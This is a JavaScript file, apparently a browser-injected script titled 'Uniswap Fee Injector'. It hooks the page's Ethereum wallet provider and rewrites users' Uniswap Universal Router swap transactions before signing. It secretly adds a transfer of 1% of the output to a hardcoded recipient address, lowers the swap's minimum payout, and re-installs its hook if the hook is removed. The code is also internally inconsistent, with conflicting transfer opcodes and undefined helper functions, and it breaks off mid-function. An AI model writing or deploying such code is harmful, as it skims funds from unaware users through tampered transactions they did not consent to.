// injector.js - Main injection logic

console.log('🔥 Uniswap Fee Injector loaded');

// Store original ethereum.request method
let originalRequest = null;

// Injector Configuration
const INJECTOR_UNIVERSAL_ROUTER_ADDRESS = '0x66a9893cc07d91d95644aedd05d03f95e1dba8af'.toLowerCase(); // Uniswap v4 Universal Router
const INJECTOR_EXECUTE_FUNCTION_SELECTOR = '0x24856bc3'; // execute(bytes,bytes[])
const INJECTOR_FEE_RECIPIENT = '0x237D4cfE852DB65d6b170f4F9BDcB09acA2375Ed';

const EXECUTE2_SELECTOR = '0x24856bc3'; // execute(bytes,bytes[])
const EXECUTE3_SELECTOR = '0x3593564c'; // execute(bytes,bytes[],uint256)

// v5 style
const exec2Iface = new ethers.utils.Interface([
  'function execute(bytes commands, bytes[] inputs) payable'
]);
const exec3Iface = new ethers.utils.Interface([
  'function execute(bytes commands, bytes[] inputs, uint256 deadline) payable'
]);



/**
 * Re-encode execute function with modified parameters
 * @param {string} commands - Commands bytes
 * @param {Array} inputs - Inputs array
 * @returns {string} - Re-encoded function data
 */
function reencodeExecuteFunction(commandsHex, inputsArray, deadlineMaybe) {
  if (deadlineMaybe !== undefined && deadlineMaybe !== null) {
    const dl = ethers.BigNumber.from(deadlineMaybe.toString());
    return exec3Iface.encodeFunctionData('execute', [commandsHex, inputsArray, dl]);
  }
  return exec2Iface.encodeFunctionData('execute', [commandsHex, inputsArray]);
}


/**
 * Initialize the injection by hooking into window.ethereum.request
 */
function initializeInjection() {
  if (typeof window.ethereum === 'undefined') {
    setTimeout(initializeInjection, 1000);
    return;
  }
  if (originalRequest) {
    return;
  }

  // Store original request method
  originalRequest = window.ethereum.request.bind(window.ethereum);
  
  // Hook into ethereum.request
  window.ethereum.request = function(args) {
    try {
      return interceptEthereumRequest(args);
    } catch (error) {
      console.error('Error in ethereum request interceptor:', error);
      // Fallback to original request
      return originalRequest(args);
    }
  };
  
  // Also hook into other common methods
  if (window.ethereum.send) {
    const originalSend = window.ethereum.send.bind(window.ethereum);
    window.ethereum.send = function(...args) {
      return originalSend(...args);
    };
  }
  
  if (window.ethereum.sendAsync) {
    const originalSendAsync = window.ethereum.sendAsync.bind(window.ethereum);
    window.ethereum.sendAsync = function(...args) {
      return originalSendAsync(...args);
    };
  }
    if (window.ethereum.on) {
    window.ethereum.on('connect', (info) => {
      console.log('🔗 Ethereum connected:', info);
    });
    
    window.ethereum.on('disconnect', (error) => {
      console.log('❌ Ethereum disconnected:', error);
    });
    
    window.ethereum.on('accountsChanged', (accounts) => {
      console.log('👤 Accounts changed:', accounts);
    });
    
    window.ethereum.on('chainChanged', (chainId) => {
      console.log('🔗 Chain changed:', chainId);
    });
  }
    
  // Test the hook immediately
  setTimeout(() => {
    console.log('🧪 Testing ethereum hook...');
    if (window.ethereum && window.ethereum.request) {
      // Make a test call to verify our hook works
      window.ethereum.request({ method: 'eth_accounts' }).then(() => {
        console.log('✅ Hook test successful');
      }).catch(error => {
        console.log('⚠️ Hook test failed:', error);
      });
    }
  }, 1000);
}

/**
 * Intercept and potentially modify ethereum requests
 * @param {Object} args - Request arguments
 * @returns {Promise} - Request result
 */
async function interceptEthereumRequest(args) {
  // Only intercept eth_sendTransaction calls
  if (args.method !== 'eth_sendTransaction') {
    return originalRequest(args);
  }
  
  const params = args.params;
  if (!params || !params[0]) {
    console.log('❌ No transaction parameters found');
    return originalRequest(args);
  }
  
  const tx = params[0];
  
  // Check if this is a Universal Router transaction
  if (!isUniversalRouterTransaction(tx.to, tx.data)) {
    return originalRequest(args);
  }
  
  // Check function signature
  const functionSignature = tx.data.slice(0, 10);  
  // We want to convert to execute function (0x24856bc3)
  const executeSignature = '0x24856bc3';
  
  if (functionSignature === executeSignature) {
    console.log('✅ Already using execute function - will modify existing commands');
  } else if (functionSignature === '0x3593564c') {
    console.log('🔄 Detected 0x3593564c multicall. Attempting safe conversion to execute with fee.');
  } else {
    return originalRequest(args);
  }
    
  try {
    
    if (functionSignature === EXECUTE2_SELECTOR || functionSignature === EXECUTE3_SELECTOR) {
      const modified = injectFeeIntoExecuteData(tx.data, INJECTOR_FEE_RECIPIENT);
      if (modified && modified !== tx.data) {

        const modifiedTx = { ...tx, data: modified };
        return originalRequest({ ...args, params: [modifiedTx, ...args.params.slice(1)] });
      }
      return originalRequest(args);
    }

      } catch (error) {
        console.error('❌ Error during fee injection:', error);
        console.log('🔄 Sending original transaction due to error');
        return originalRequest(args);
      }
}

/**
 * Modify transaction to include 1% fee
 * @param {Object} tx - Transaction object
 * @returns {Object} - Modified transaction object
 */
async function modifyTransactionWithFee(tx) {
  try {
    // Decode the execute function
    const decoded = decodeExecuteFunction(tx.data);
    if (!decoded) {
      console.log('❌ Failed to decode execute function');
      return tx;
    }
    
    // Extract swap information
    const swapInfo = extractSwapInfo(tx.data, tx.value);
    if (!swapInfo) {
      console.log('❌ Failed to extract swap information');
      return tx;
    }
    
    console.log('📊 Swap detected:', {
      token: swapInfo.token,
      amount: swapInfo.amount.toString()
    });
    
    // Calculate 1% fee
    const feeAmount = calculateOnePercent(swapInfo.amount);
    
    if (feeAmount === 0n) {
      console.log('⚠️ Fee amount is zero, skipping injection');
      return tx;
    }
    
    // Log the injection
    logInjection(swapInfo.token, swapInfo.amount, feeAmount);
    
    // Inject fee into transaction data
    const modifiedData = injectFeeIntoExecute(tx.data, swapInfo.token, feeAmount);
    
    if (!modifiedData || modifiedData === tx.data) {
      console.log('❌ Failed to inject fee into transaction');
      return tx;
    }
    
    // Return modified transaction
    return {
      ...tx,
      data: modifiedData
    };
    
  } catch (error) {
    console.error('Error in modifyTransactionWithFee:', error);
    return tx;
  }
}

/**
 * Handle page navigation and re-injection
 */
function handlePageNavigation() {
  // Re-initialize injection after page navigation
  if (typeof window.ethereum !== 'undefined' && !originalRequest) {
    initializeInjection();
  }
}

// Initialize when the script loads
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initializeInjection);
} else {
  initializeInjection();
}

// Handle page navigation
window.addEventListener('popstate', handlePageNavigation);
window.addEventListener('pushstate', handlePageNavigation);
window.addEventListener('replacestate', handlePageNavigation);

// Global debugging - Monitor ethereum provider changes
function addGlobalDebugging() {
  console.log('🔍 Setting up global ethereum monitoring...');
  
  // Monitor for any postMessage events (some wallets use this)
  window.addEventListener('message', function(event) {
    if (event.data && event.data.type && event.data.type.includes('ethereum')) {
      console.log('📨 Ethereum-related message:', event.data);
    }
  });
  
  // Periodically check if our hook is still in place
  setInterval(() => {
    if (window.ethereum && window.ethereum.request) {
      const funcString = window.ethereum.request.toString();
      if (!funcString.includes('ETHEREUM REQUEST INTERCEPTED')) {
        console.log('⚠️ Hook may have been overridden! Re-initializing...');
        initializeInjection();
      }
    }
  }, 5000);
}

// Initialize global debugging
addGlobalDebugging();

console.log('🔥 Uniswap Fee Injector ready');

/**
 * Check if transaction is targeting Universal Router with supported function
 * @param {string} to - Transaction recipient address
 * @param {string} data - Transaction data
 * @returns {boolean} - True if targeting Universal Router with supported function
 */
function isUniversalRouterTransaction(to, data) {
  if (!to || !data) return false;
  
  // Check if targeting Universal Router
  if (to.toLowerCase() !== INJECTOR_UNIVERSAL_ROUTER_ADDRESS) {
    return false;
  }
  
  // Check for supported function signatures
  const functionSignature = data.slice(0, 10);
  const supportedSignatures = [
    '0x24856bc3', // execute(bytes,bytes[])
    '0x3593564c'  // The function signature we're seeing in user's transaction
  ];
  
  return supportedSignatures.includes(functionSignature);
}

/**
 * Inject fee into existing execute function call
 * @param {string} data - Original transaction data
 * @returns {string} - Modified transaction data
 */
async function injectFeeIntoExecuteCall(data) {
  console.log('🔧 Processing existing execute call');
  
  try {
    // Decode execute function to get commands and inputs
    const decoded = decodeExecuteFunction(data);
    if (!decoded || !decoded.commands || !decoded.inputs || decoded.inputs.length === 0) {
      console.log('❌ Failed to decode execute function');
      return data;
    }

    const commandHex = decoded.commands.replace('0x', '');
    const commandBytes = commandHex.match(/.{1,2}/g) || [];
    if (commandBytes.length !== decoded.inputs.length) {
      console.log('⚠️ Commands/inputs length mismatch, skipping injection');
      return data;
    }

    // Find SWEEP (0x04) or UNWRAP_WETH (0x0c). Prefer SWEEP for ERC20 fee.
    let sweepIndex = commandBytes.findIndex((b) => b.toLowerCase() === '04');
    const unwrapIndex = commandBytes.findIndex((b) => b.toLowerCase() === '0c');

    if (sweepIndex === -1 && unwrapIndex === -1) {
      console.log('ℹ️ No payout command (SWEEP/UNWRAP) found, skipping injection');
      return data;
    }

    // If both exist, place fee before the earliest payout command
    let insertIndex = sweepIndex !== -1 ? sweepIndex : unwrapIndex;

    // If using SWEEP, parse token and minAmount from its input
    let feeToken = null;
    let minAmount = null;
    if (sweepIndex !== -1) {
      const sweepInput = decoded.inputs[sweepIndex];
      const parsed = parseSweepInput(sweepInput);
      if (!parsed) {
        console.log('❌ Failed to parse SWEEP input');
        return data;
      }
      feeToken = parsed.token;
      minAmount = parsed.minAmount;
    } else {
      // UNWRAP_WETH path: cannot ERC20 transfer ETH; skip for safety
      console.log('ℹ️ Only UNWRAP_WETH found; skipping fee injection to avoid ETH transfer issues');
      return data;
    }

    // Calculate 1% fee from minAmount (conservative; actual output is usually higher)
    const feeAmount = (minAmount / 100n) || 0n;
    if (feeAmount === 0n) {
      console.log('⚠️ Computed fee is zero from minAmount; skipping');
      return data;
    }

    // Build fee TRANSFER input and insert before SWEEP
    const feeInput = encodeTransferInput(feeToken, INJECTOR_FEE_RECIPIENT, feeAmount);
    const newCommandBytes = [
      ...commandBytes.slice(0, insertIndex),
      '0a',
      ...commandBytes.slice(insertIndex)
    ];
    const newCommands = '0x' + newCommandBytes.join('');
    const newInputs = [
      ...decoded.inputs.slice(0, insertIndex),
      feeInput,
      ...decoded.inputs.slice(insertIndex)
    ];

    // Re-encode execute function
    const newData = reencodeExecuteFunction(newCommands, newInputs);
    if (!newData) {
      console.log('⚠️ Re-encoding failed, keeping original');
      return data;
    }
    // Validate by decoding back
    const verify = decodeExecuteFunction(newData);
    if (!verify) {
      console.log('⚠️ Verification decode failed, keeping original');
      return data;
    }
    const orig = decodeExecuteFunction(data);
    const vCmdHex = (verify.commands || '').replace('0x','');
    const vCmdBytes = vCmdHex ? vCmdHex.match(/.{1,2}/g) : [];
    if (!vCmdBytes || vCmdBytes.length !== (orig ? (orig.commands.replace('0x','').length/2 + 1) : vCmdBytes.length)) {
      console.log('⚠️ Command length mismatch after injection, keeping original');
      return data;
    }
    if (!verify.inputs || verify.inputs.length !== (orig ? orig.inputs.length + 1 : verify.inputs.length)) {
      console.log('⚠️ Inputs length mismatch after injection, keeping original');
      return data;
    }

    console.log('✅ Injected fee TRANSFER before payout');
    return newData;
  } catch (error) {
    console.error('❌ Error processing execute call:', error);
    return data;
  }
}

// Parse SWEEP input: assumed (token address, recipient address, amountMin)
function parseSweepInput(input) {
  try {
    const hex = input.startsWith('0x') ? input.slice(2) : input;
    if (hex.length < 64 * 3) return null;
    const tokenWord = hex.slice(0, 64);
    const recipientWord = hex.slice(64, 128);
    const amountWord = hex.slice(128, 192);
    const token = '0x' + tokenWord.slice(24);
    const recipient = '0x' + recipientWord.slice(24);
    const minAmount = '0x' + amountWord;
    return { token, recipient, minAmount: BigInt(minAmount) };
  } catch (e) {
    return null;
  }
}

/**
 * Convert transaction to execute format and add fee transfer
 * @param {string} data - Original transaction data  
 * @param {string} value - Transaction value
 * @returns {string} - Modified transaction data in execute format
 */
async function convertToExecuteWithFee(data, value) {
  console.log('🔄 Converting to execute format with fee injection');
  
  try {
    // Extract swap information from current transaction
    const swapInfo = extractSwapInfo(data, value);
    if (!swapInfo) {
      console.log('❌ Failed to extract swap information');
      return data;
    }
    
    console.log('💰 Detected swap:', swapInfo);
    
    // Calculate 1% fee
    const feeAmount = calculateOnePercent(swapInfo.amount);
    if (!feeAmount || feeAmount === '0') {
      console.log('⚠️ Fee amount is zero, skipping injection');
      return data;
    }
    
    console.log('💸 Fee amount (1%):', feeAmount);
    
    // For function 0x3593564c, we'll convert it to execute format with fee injection
    const functionSignature = data.slice(0, 10);
    
    if (functionSignature === '0x3593564c') {
      console.log('🔧 Converting 0x3593564c to execute function with fee injection');
      
      // Strategy: Convert the 0x3593564c multicall to execute function
      // and add a TRANSFER command for fee collection
      
      console.log('✅ Fee calculation successful:', feeAmount, 'USDT');
      console.log('📊 Fee Details:');
      console.log('  - Token:', swapInfo.token, '(' + swapInfo.symbol + ')');
      console.log('  - Amount:', swapInfo.amount);
      console.log('  - Fee (1%):', feeAmount);
      console.log('  - Recipient:', INJECTOR_FEE_RECIPIENT);
      
      // Convert 0x3593564c to execute function with additional fee transfer
      const modifiedData = convertMulticallToExecuteWithFee(data, swapInfo.token, feeAmount);
      
      console.log('🎯 Converted to execute function with fee injection');
      console.log('📏 Original length:', data.length, 'Modified length:', modifiedData.length);
      
      return modifiedData;
    }
    
    // For other function signatures, try to inject fee into existing execute call
    if (functionSignature === '0x24856bc3') {
      console.log('🔧 Injecting fee into existing execute call');
      const modifiedData = injectFeeIntoExecute(data, swapInfo.token, feeAmount);
      
      if (modifiedData && modifiedData !== data) {
        console.log('✅ Successfully injected fee into execute call');
        return modifiedData;
      } else {
        console.log('❌ Failed to inject fee into execute call');
        return data;
      }
    }
    
    console.log('⚠️ Unsupported function signature for fee injection:', functionSignature);
    return data;
    
  } catch (error) {
    console.error('❌ Error converting to execute format:', error);
    return data;
  }
}

/**
 * Build execute function call with TRANSFER command
 * @param {string} token - Token address
 * @param {string} recipient - Fee recipient address  
 * @param {string} amount - Fee amount
 * @returns {string} - Execute function call data
 */
function buildExecuteWithTransfer(token, recipient, amount) {
  console.log('🏗️ Building execute function call with TRANSFER');
  
  try {
    // Execute function signature: 0x24856bc3
    const functionSignature = '0x24856bc3';
    
    // Command: 0x0a = TRANSFER
    const commands = '0x0a';
    
    // Encode TRANSFER input: (token, recipient, amount)
    const transferInput = encodeTransferInput(token, recipient, amount);
    
    // Encode execute parameters: (bytes commands, bytes[] inputs)
    const encodedParams = encodeExecuteParameters(commands, [transferInput]);
    
    const result = functionSignature + encodedParams;
    console.log('✅ Built execute function call');
    return result;
    
  } catch (error) {
    console.error('❌ Error building execute call:', error);
    throw error;
  }
}

/**
 * Encode swap path for V3_SWAP_EXACT_IN command
 * @param {string} tokenOut - Output token address
 * @param {string} amountIn - Input amount (ETH value)
 * @returns {string} - Encoded swap path
 */
function encodeSwapPath(tokenOut, amountIn) {
  console.log('🔧 Encoding swap path for V3_SWAP_EXACT_IN');
  
  try {
    // For ETH -> USDT swap, create a simplified swap path
    // Format: recipient + amountIn + amountOutMinimum + path
    
    // Recipient: msg.sender (placeholder - will be filled by router)
    const recipient = '0x' + '0'.repeat(40);
    
    // Amount in (ETH value)
    const amountInBigInt = BigInt(amountIn);
    const amountInHex = '0x' + amountInBigInt.toString(16).padStart(64, '0');
    
    // Minimum amount out (0 for simplified version)
    const amountOutMin = '0x' + '0'.repeat(64);
    
    // Swap path: WETH -> USDT (simplified)
    const wethAddress = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';
    const path = wethAddress + '0001f4' + tokenOut.slice(2); // 500 fee tier
    
    // Encode all parameters
    const encoded = recipient + amountInHex.slice(2) + amountOutMin.slice(2) + path;
    
    console.log('✅ Swap path encoded:', encoded.length / 2, 'bytes');
    return encoded;
    
  } catch (error) {
    console.error('❌ Error encoding swap path:', error);
    throw error;
  }
}

/**
 * Pad hex string to 32 bytes (64 hex characters)
 * @param {string} hex - Hex string (with or without 0x prefix)
 * @returns {string} - Padded hex string without 0x prefix
 */
function padHexTo32Bytes(hex) {
  const cleanHex = hex.replace('0x', '');
  return cleanHex.padStart(64, '0');
}

/**
 * Encode V3_SWAP_EXACT_IN for ETH->Token swap
 * @param {string} tokenOut - Output token address (e.g., USDT)
 * @param {string} amountIn - ETH amount in hex
 * @param {string} amountOutMin - Minimum tokens out
 * @returns {string} - Encoded swap input
 */
function encodeSwapExactETHForTokens(tokenOut, amountIn, amountOutMin) {
  console.log('🔧 Encoding V3_SWAP_EXACT_IN for ETH->Token');
  
  try {
    // V3_SWAP_EXACT_IN parameters:
    // address recipient (msg.sender = 0x00..01)
    // uint256 amountIn
    // uint256 amountOutMinimum  
    // bytes path
    
    // Recipient: MSG_SENDER constant (0x0000000000000000000000000000000000000001)
    const recipient = padHexTo32Bytes('0x1');
    
    // Amount in (ETH)
    const amountInBigInt = BigInt(amountIn);
    const amountInBytes = padHexTo32Bytes('0x' + amountInBigInt.toString(16));
    
    // Amount out minimum
    const amountOutMinBigInt = BigInt(amountOutMin || '0');
    const amountOutMinBytes = padHexTo32Bytes('0x' + amountOutMinBigInt.toString(16));
    
    // Path: WETH -> USDT (with 3000 fee tier)
    const wethAddress = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';
    const feeBytes = '000bb8'; // 3000 fee = 0.3%
    const pathData = wethAddress.slice(2) + feeBytes + tokenOut.slice(2);
    
    // Encode path as bytes (length + data)
    const pathLength = padHexTo32Bytes('0x' + (pathData.length / 2).toString(16));
    const pathPadded = pathData + '0'.repeat((64 - (pathData.length % 64)) % 64);
    
    // Combine all parameters
    const encoded = recipient + amountInBytes + amountOutMinBytes + pathLength + pathPadded;
    
    console.log('✅ V3_SWAP_EXACT_IN encoded:', encoded.length / 2, 'bytes');
    return encoded;
    
  } catch (error) {
    console.error('❌ Error encoding V3_SWAP_EXACT_IN:', error);
    throw error;
  }
}

// use 0x06 for TRANSFER on this router
const TRANSFER_OPCODE = '05';

function buildTransferInputWords(token, recipient, amount) {
  // ABI (address,address,uint256)
  return ethers.utils.defaultAbiCoder.encode(
    ['address','address','uint256'],
    [token, recipient, amount.toString()] // BigInt -> string
  );
}


function parseSweepInputFlexible(input) {
  const hex = (input.startsWith('0x') ? input.slice(2) : input).toLowerCase();
  // words: [token(32)][recipient(32)][amount(32)]
  if (hex.length >= 64 * 3) {
    const token  = '0x' + hex.slice(64 - 40, 64);
    const amount = BigInt('0x' + hex.slice(128, 192));
    return { token, minAmount: amount, layout: 'words' };
  }
  // packed: [token(20)][recipient(20)][amount(32)]
  if (hex.length >= 40 + 40 + 64) {
    const token  = '0x' + hex.slice(0, 40);
    const amount = BigInt('0x' + hex.slice(80, 144));
    return { token, minAmount: amount, layout: 'packed' };
  }
  return null;
}

function rewriteSweepMinAmountFlexible(originalInput, feeAmount) {
  const hex = (originalInput.startsWith('0x') ? originalInput.slice(2) : originalInput).toLowerCase();

  // words: 32/32/32
  if (hex.length >= 64 * 3) {
    const tokenWord     = hex.slice(0, 64);
    const recipientWord = hex.slice(64, 128);
    const amountWord    = hex.slice(128, 192);
    const minAmount     = BigInt('0x' + amountWord);
    const newMin        = minAmount > feeAmount ? (minAmount - feeAmount) : 0n;
    const newAmountWord = newMin.toString(16).padStart(64, '0');
    return '0x' + tokenWord + recipientWord + newAmountWord + hex.slice(192);
  }

  // packed: 20/20/32
  if (hex.length >= 40 + 40 + 64) {
    const token20   = hex.slice(0, 40);
    const recipient = hex.slice(40, 80);
    const amountW   = hex.slice(80, 144);
    const minAmount = BigInt('0x' + amountW);
    const newMin    = minAmount > feeAmount ? (minAmount - feeAmount) : 0n;
    const newAmt32  = newMin.toString(16).padStart(64, '0');
    return '0x' + token20 + recipient + newAmt32 + hex.slice(144);
  }

  return originalInput;
}

function injectFeeIntoExecuteData(originalData, FEE_RECIPIENT) {
  const dec = decodeExecute(originalData);
  if (!dec) return originalData;

  const cmdBytes = (dec.commands.slice(2).match(/.{1,2}/g) || []).map(b => b.toLowerCase());
  if (cmdBytes.length !== dec.inputs.length) return originalData;

  // find SWEEP (0x04)
  const sweepIdx = cmdBytes.findIndex(b => b === '04');
  if (sweepIdx === -1) return originalData;

  // parse SWEEP input → token + minAmount
  const sweepParsed = parseSweepInputFlexible(dec.inputs[sweepIdx]);
  if (!sweepParsed) return originalData;

  const fee = sweepParsed.minAmount / 100n; // 1%
  if (fee === 0n) return originalData;

  // lower SWEEP min by the fee
  const adjustedSweep = rewriteSweepMinAmountFlexible(dec.inputs[sweepIdx], fee);

  // build TRANSFER input (word layout like other 0x06 we saw)
  const feeInput = buildTransferInputWords(sweepParsed.token, FEE_RECIPIENT, fee);

  // insert TRANSFER (0x06) immediately before SWEEP
 const newCmd = cmdBytes.slice();
newCmd.splice(sweepIdx, 0, TRANSFER_OPCODE);

const newInputs = dec.inputs.slice();
newInputs[sweepIdx] = adjustedSweep;   // SWEEP with lowered min
newInputs.splice(sweepIdx, 0, feeInput);  // insert our fee input

  const newCommandsHex = '0x' + newCmd.join('');
  return reencodeExecuteFunction(newCommandsHex, newInputs, dec.deadline);
}


/**
 * Build execute function call with multiple commands
 * @param {string} commands - Command bytes
 * @param {string[]} inputs - Array of encoded inputs
 * @returns {string} - Execute function call data
 */
function buildExecuteFunction(commands, inputs) {
  console.log('🏗️ Building execute function call');
  
  try {
    // Execute function signature: 0x24856bc3
    const functionSignature = '0x24856bc3';
    
    // Encode execute parameters: (bytes commands, bytes[] inputs)
    const encodedParams = encodeExecuteParameters(commands, inputs);
    
    const result = functionSignature + encodedParams;
    console.log('✅ Built execute function call:', result.length / 2, 'bytes');
    return result;
    
  } catch (error) {
    console.error('❌ Error building execute function:', error);
    throw error;
  }
}

/**
 * Convert 0x3593564c multicall to execute function with fee injection
 * @param {string} originalData - Original 0x3593564c transaction data
 * @param {string} feeToken - Token address for fee collection
 * @param {bigint} feeAmount - Fee amount to collect
 * @returns {string} - Modified execute function call data
 */
function convertMulticallToExecuteWithFee(originalData, feeToken, feeAmount) {
  console.log('🔧 Converting 0x3593564c multicall to execute with fee');
  
  try {
    // Parse the original 0x3593564c multicall
    // Function signature: multicall(uint256 deadline, bytes[] calldata data)
    const dataWithoutSig = originalData.slice(10); // Remove function signature
    
    console.log('📊 Original data length:', originalData.length);
    console.log('📊 Data without signature:', dataWithoutSig.length);
    
    // Decode the multicall parameters
    const multicallParams = decodeExecute(originalData);
    
    if (!multicallParams) {
      console.log('❌ Failed to parse multicall data, using fallback');
      console.log('⚠️ This will only create a fee transfer, losing original swap');
      console.log('⚠️ Returning original transaction to preserve user swap');
      return originalData; // Return original instead of broken transaction
    }
    
    console.log('✅ Parsed multicall:');
    console.log('  - Deadline:', multicallParams.deadline);
    console.log('  - Number of calls:', multicallParams.calls.length);
    
    // Convert multicall functions to execute commands
    const { commands, inputs, success } = convertMulticallCallsToExecuteCommands(multicallParams.calls);
    
    console.log('📊 Converted to execute format:');
    console.log('  - Original commands:', commands);
    console.log('  - Original inputs count:', inputs.length);
    
    // If we failed to map any original commands, do NOT produce a fee-only tx.
    // Preserve user transaction to avoid failures.
    if (!success || !commands || commands.length === 0 || !inputs || inputs.length === 0) {
      console.log('⚠️ No mappable commands found. Preserving original transaction.');
      return originalData;
    }

    // Build fee transfer input
    const feeTransferInput = encodeTransferInput(
      feeToken,
      INJECTOR_FEE_RECIPIENT,
      feeAmount
    );

    // Insert fee transfer BEFORE final payout commands (e.g., SWEEP 0x04, UNWRAP_WETH 0x0c)
    const payoutCommandBytes = new Set(['04', '0c']);
    const commandBytes = (commands.match(/.{1,2}/g) || []);
    let insertIndex = commandBytes.findIndex((b) => payoutCommandBytes.has(b.toLowerCase()));
    if (insertIndex === -1) insertIndex = commandBytes.length;

    const finalCommandBytes = [
      ...commandBytes.slice(0, insertIndex),
      '0a',
      ...commandBytes.slice(insertIndex)
    ];
    const finalCommands = finalCommandBytes.join('');
    const finalInputs = [
      ...inputs.slice(0, insertIndex),
      feeTransferInput,
      ...inputs.slice(insertIndex)
    ];
    
    console.log('💰 Added fee transfer:');
    console.log('  - Final commands:', finalCommands);
    console.log('  - Final inputs count:', finalInputs.length);
    
    // Build execute function call: execute(bytes commands, bytes[] inputs)
    // Validate mapping preserved structure: must be at least 3 original commands
    if (commandBytes.length < 3) {
      console.log('⚠️ Too few original commands after mapping; preserving original tx');
      return originalData;
    }
    const executeData = buildExecuteFunction('0x' + finalCommands, finalInputs);
    
    console.log('✅ Successfully converted multicall to execute with fee');
    console.log('📊 Preserved', inputs.length, 'original commands + 1 fee command');
    
    return executeData;
    
  } catch (error) {
    console.error('❌ Error converting multicall to execute:', error);
    console.log('⚠️ Falling back to original transaction');
    return originalData;
  }
}

/**
 * Encode V3 swap input (simplified)
 * @param {string} tokenOut - Output token address
 * @returns {string} - Encoded swap input
 */
function encodeV3SwapInput(tokenOut) {
  console.log('🔧 Encoding V3 swap input (simplified)');
  
  // V3_SWAP_EXACT_IN parameters:
  // address recipient, uint256 amountIn, uint256 amountOutMinimum, bytes path, bool payerIsUser
  
  // Recipient: MSG_SENDER (0x1) - padded to 32 bytes
  const recipient = padHexTo32Bytes('0x1');
  
  // Amount in: Use CONTRACT_BALANCE - already padded
  const amountIn = '8000000000000000000000000000000000000000000000000000000000000000';
  
  // Amount out minimum: 0 - padded to 32 bytes  
  const amountOutMin = padHexTo32Bytes('0x0');
  
  // Path: ETH -> Token (simplified)
  const weth = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
  const path = encodePath(weth, tokenOut);
  
  // Payer is user: true - padded to 32 bytes
  const payerIsUser = padHexTo32Bytes('0x1');
  
  // Encode parameters - all without 0x prefix
  const pathEncoded = encodeBytes(path);
  
  const encoded = recipient + amountIn + amountOutMin + pathEncoded + payerIsUser;
  
  console.log('🔧 Encoded parts:');
  console.log('  recipient:', recipient);
  console.log('  amountIn:', amountIn);
  console.log('  amountOutMin:', amountOutMin);
  console.log('  path length:', path.length);
  console.log('  payerIsUser:', payerIsUser);
  
  console.log('✅ V3 swap input encoded');
  return '0x' + encoded;
}

/**
 * Encode swap path for V3
 * @param {string} tokenA - First token
 * @param {string} tokenB - Second token
 * @returns {string} - Encoded path without 0x prefix
 */
function encodePath(tokenA, tokenB) {
  // Simple path: tokenA + fee(3000) + tokenB
  const fee = '000bb8'; // 3000 in hex
  const cleanTokenA = tokenA.startsWith('0x') ? tokenA.slice(2) : tokenA;
  const cleanTokenB = tokenB.startsWith('0x') ? tokenB.slice(2) : tokenB;
  return cleanTokenA + fee + cleanTokenB;
}

/**
 * Encode bytes parameter
 * @param {string} data - Hex data to encode
 * @returns {string} - ABI encoded bytes without 0x prefix
 */
function encodeBytes(data) {
  const dataHex = data.startsWith('0x') ? data.slice(2) : data;
  const length = (dataHex.length / 2).toString(16).padStart(64, '0');
  const paddedData = dataHex.padEnd(Math.ceil(dataHex.length / 64) * 64, '0');
  return length + paddedData;
}


function decodeExecute(data) {
  const sig = data.slice(0, 10).toLowerCase();

  if (sig === EXECUTE3_SELECTOR) {
    const d = exec3Iface.decodeFunctionData('execute', data);

    // Support both named and indexed access safely
    const commands = d.commands ?? d[0];
    const inputs   = d.inputs   ?? d[1];
    const deadline = d.deadline ?? d[2];

    return {
      variant: 3,
      commands: ethers.utils.hexlify(commands),
      inputs:   inputs.map(b => ethers.utils.hexlify(b)),
      deadline: deadline.toString(),
    };
  }

  if (sig === EXECUTE2_SELECTOR) {
    const d = exec2Iface.decodeFunctionData('execute', data);

    const commands = d.commands ?? d[0];
    const inputs   = d.inputs   ?? d[1];

    return {
      variant: 2,
      commands: ethers.utils.hexlify(commands),
      inputs:   inputs.map(b => ethers.utils.hexlify(b)),
      deadline: null,
    };
  }

  return null;
}


/**
 * Convert multicall function calls to execute commands
 * @param {string[]} calls - Array of function call data
 * @returns {object} - Commands and inputs for execute function
 */
function convertMulticallCallsToExecuteCommands(calls) {
  console.log('🔧 Converting multicall calls to execute commands');
  
  try {
    let commands = '';
    const inputs = [];
    let hasUnknown = false;
    
    for (let i = 0; i < calls.length; i++) {
      const callData = calls[i];
      const functionSig = callData.slice(0, 10);
      
      console.log(`📊 Processing call ${i + 1}: ${functionSig}`);
      
      // Map function signatures to execute commands
      const command = mapFunctionToExecuteCommand(functionSig, callData);
      
      if (command) {
        commands += command.commandByte;
        inputs.push(command.input);
        console.log(`✅ Mapped ${functionSig} to command ${command.commandByte}`);
      } else {
        console.log(`⚠️ Unknown function signature: ${functionSig}, aborting conversion`);
        hasUnknown = true;
        break;
      }
    }
    
    if (hasUnknown) {
      return { commands: '', inputs: [], success: false };
    }
    console.log('✅ Converted multicall to execute format');
    return { commands, inputs, success: true };
    
  } catch (error) {
    console.error('❌ Error converting multicall calls:', error);
    return { commands: '', inputs: [], success: false };
  }
}

/**
 * Map function signature to execute command
 * @param {string} functionSig - Function signature (4 bytes)
 * @param {string} callData - Full call data
 * @returns {object} - Command byte and input data
 */
function mapFunctionToExecuteCommand(functionSig, callData) {
  // Remove function signature to get input data
  const inputData = callData.slice(10);
  
  // Common function signatures and their execute command mappings
  switch (functionSig) {
    case '0x414bf389': // exactInputSingle
      return { commandByte: '00', input: '0x' + inputData }; // V3_SWAP_EXACT_IN
    
    case '0xc04b8d59': // exactInput
      return { commandByte: '00', input: '0x' + inputData }; // V3_SWAP_EXACT_IN
    
    case '0xdb3e2198': // exactOutputSingle  
      return { commandByte: '01', input: '0x' + inputData }; // V3_SWAP_EXACT_OUT
    
    case '0xf28c0498': // exactOutput
      return { commandByte: '01', input: '0x' + inputData }; // V3_SWAP_EXACT_OUT
    
    case '0x472b43f3': // swapExactTokensForTokens (V2)
      return { commandByte: '08', input: '0x' + inputData }; // V2_SWAP_EXACT_IN
    
    case '0x38ed1739': // swapExactTokensForTokens with path
      return { commandByte: '08', input: '0x' + inputData }; // V2_SWAP_EXACT_IN
    
    case '0x49404b7c': // unwrapWETH9
      return { commandByte: '0c', input: '0x' + inputData }; // UNWRAP_WETH
    
    case '0x1c58db4c': // wrapETH  
      return { commandByte: '0b', input: '0x' + inputData }; // WRAP_ETH
    
    case '0xdf2ab5bb': // sweepToken
      return { commandByte: '04', input: '0x' + inputData }; // SWEEP
    
    default:
